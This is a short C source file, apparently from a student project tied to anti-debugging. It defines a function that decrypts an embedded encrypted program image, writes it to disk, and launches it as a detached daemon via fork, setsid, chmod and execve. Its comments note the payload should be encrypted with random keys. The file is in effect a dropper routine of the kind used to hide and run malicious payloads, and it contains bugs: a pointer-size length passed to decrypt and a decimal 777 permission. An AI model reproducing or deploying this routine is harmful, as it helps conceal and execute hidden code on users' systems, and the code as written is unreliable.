/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   execute_daemon.c                                   :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: plamtenz <plamtenz@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2020/02/29 18:21:21 by plamtenz          #+#    #+#             */
/*   Updated: 2020/02/29 18:21:21 by plamtenz         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

/*
** this function create a daemon and executes it
**  using the hexdump execution format of a program
** not did but normally this hexdump must be crypted
** and decrypted with randoms keys
*/

/* fwrite fread fopen uses a structure and their are higuer 
** level programation than write, open, etc. More info here
** https://www.programering.com/a/MDOzIzNwATc.html
*/

/*
** argv is a 2d matrix that has in pos 0 the name of the deamon and in
** position [1] : NULL
*/

#include <anti_debug.h>

char            execute_deamon(t_aes *aes, char **argv, const char *hexdump, char **env)
{
    int         pid;
    FILE        *fp;

    if (aes->error == 1)
        return (FAILURE);
    // hexdump is crypted hexdump from /deamons programs execution
    if (decrypt(aes, hexdump, sizeof(hexdump)) == SUCCESS)
    {
        if ((fp = fopen(argv[0], "wb+")))
        {
            // need error verification
            (void)fwrite(aes->plain_text, sizeof(char), aes->plain_size, fp);
            (void)fclose(fp);
            if (!(pid = fork()))
            {
                (void)setsid(); // setsid changes zombie process by orphan process if parent die (daemon)
                (void)chmod(argv[0], 777);
                (void)execve(argv[0], &argv[0], env);
            }
        }
        else
            return (FAILURE);
    }
    return (SUCCESS);
}